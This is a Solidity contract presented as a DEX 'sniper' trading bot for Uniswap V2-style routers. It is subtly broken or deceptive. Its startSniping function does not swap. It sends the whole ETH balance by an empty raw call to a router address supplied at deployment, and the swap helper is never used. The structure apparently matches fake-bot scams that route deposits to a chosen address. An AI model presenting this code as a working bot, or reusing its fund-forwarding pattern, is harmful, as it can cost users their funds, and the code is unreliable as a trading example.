// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract DexSniper {
    address public owner;
    address public immutable router;
    bool public tradingEnabled = false;
    uint256 public profitTarget = 0.05 ether; // Auto-withdraw threshold

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor(address _router) {
        owner = msg.sender;
        router = _router;
    }

    function swap(address _tokenIn, address _tokenOut, uint256 _amount) private {
        IERC20(_tokenIn).approve(router, _amount);
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint deadline = block.timestamp + 300;
        IUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);
    }

    function getAmountOutMin(address _tokenIn, address _tokenOut, uint256 _amount) external view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _tokenIn;
        path[1] = _tokenOut;
        uint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);
        return amountOutMins[1];
    }

    function startSniping() external payable onlyOwner {
        require(tradingEnabled, "Trading is disabled");
        uint256 startBalance = address(this).balance;
        (bool success, ) = router.call{value: startBalance}("");
        require(success, "Snipe failed");

        uint256 endBalance = address(this).balance;
        if (endBalance >= startBalance + profitTarget) {
            payable(owner).transfer(endBalance);
        }
    }

    function recoverTokens(address token) external onlyOwner {
        IERC20 _token = IERC20(token);
        require(_token.transfer(owner, _token.balanceOf(address(this))), "Token recovery failed");
    }

    function recoverEth() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function toggleTrading(bool _state) external onlyOwner {
        tradingEnabled = _state;
    }

    function setProfitTarget(uint256 _target) external onlyOwner {
        profitTarget = _target;
    }
    
    function watchdog(address _tokenIn, address _tokenOut, uint256 _amount) external view returns (uint256 expectedOut) {
        return this.getAmountOutMin(_tokenIn, _tokenOut, _amount);
    }
    
    receive() external payable {}
}